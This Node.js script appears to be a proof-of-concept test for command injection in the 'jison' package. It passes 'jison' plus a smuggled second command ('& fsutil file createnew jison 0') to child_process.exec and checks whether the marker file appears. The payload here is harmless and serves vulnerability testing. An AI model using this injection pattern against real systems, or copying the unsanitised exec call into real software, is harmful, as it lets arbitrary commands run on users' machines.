Reflect.getPrototypeOf = () => false;
exec = require('child_process').exec;
const fs = require('fs');
const path = './jison';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
let command = '& fsutil file createnew jison 0';
exec('jison ' + command, function (error) {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});